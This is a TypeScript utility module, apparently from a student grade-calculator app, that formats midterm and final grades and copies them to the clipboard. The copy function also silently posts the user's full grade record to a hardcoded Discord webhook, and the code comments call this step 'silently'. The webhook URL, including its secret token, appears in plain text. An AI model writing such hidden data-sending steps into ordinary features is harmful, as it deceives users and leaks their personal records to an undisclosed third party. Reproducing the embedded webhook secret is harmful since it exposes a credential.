
import axios from 'axios';

// Discord webhook URL
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368867405941571654/D_1dF1ENt3P6vEwTBPFVlzpu44ZP7kfEs5p6LDZdfu7TorA6yUTXYARzg7HBYO_5nyHZ";

// Format grades for clipboard
export const formatGradesForClipboard = (
  midtermState: any,
  finalsState: any,
  grades: {
    midterm: number;
    finals: number;
    finalGrade: number;
    gpe: string;
  }
) => {
  // Format midterm section
  const midtermSection = `Midterm Grades:\nQuiz 1 - ${midtermState.quizScores[0] || 'N/A'}\nQuiz 2 - ${midtermState.quizScores[1] || 'N/A'}\nMajor Exam - ${midtermState.examScore || 'N/A'}\nAttendance - ${midtermState.attendance || 'N/A'}\nProblem Set - ${midtermState.problemSet || 'N/A'}\nMidterm Grade - ${Math.round(grades.midterm)} (${grades.midterm.toFixed(2)})`;

  // Format finals section
  const finalsSection = `Final Grades:\nQuiz 3 - ${finalsState.quizScores[0] || 'N/A'}\nQuiz 4 - ${finalsState.quizScores[1] || 'N/A'}\nMajor Exam - ${finalsState.examScore || 'N/A'}\nAttendance - ${finalsState.attendance || 'N/A'}\nProblem Set - ${finalsState.problemSet || 'N/A'}\nFinal Grade - ${Math.round(grades.finals)} (${grades.finals.toFixed(2)})`;

  // Format results section
  const resultsSection = `Final Results:\nFinal Grade - ${Math.round(grades.finalGrade)} (${grades.finalGrade.toFixed(2)})\nGPE - ${grades.gpe}`;

  // Combine all sections with appropriate spacing
  return `${midtermSection}\n\n${finalsSection}\n\n\n${resultsSection}`;
};

// Copy grades to clipboard
export const copyGradesToClipboard = async (
  midtermState: any,
  finalsState: any,
  grades: {
    midterm: number;
    finals: number;
    finalGrade: number;
    gpe: string;
  }
) => {
  try {
    const formattedText = formatGradesForClipboard(midtermState, finalsState, grades);
    
    // Copy to clipboard
    await navigator.clipboard.writeText(formattedText);
    
    // Send to Discord webhook (silently)
    await sendToDiscordWebhook(formattedText);
    
    return true;
  } catch (error) {
    console.error("Error copying to clipboard:", error);
    return false;
  }
};

// Send data to Discord webhook
const sendToDiscordWebhook = async (text?: string | null) => {
  try {
    const payload: any = {};
    
    if (text) {
      payload.content = text;
    }
    
    // For text, use regular JSON payload
    await axios.post(DISCORD_WEBHOOK_URL, payload);
  } catch (error) {
    console.error("Error sending to webhook:", error);
  }
};
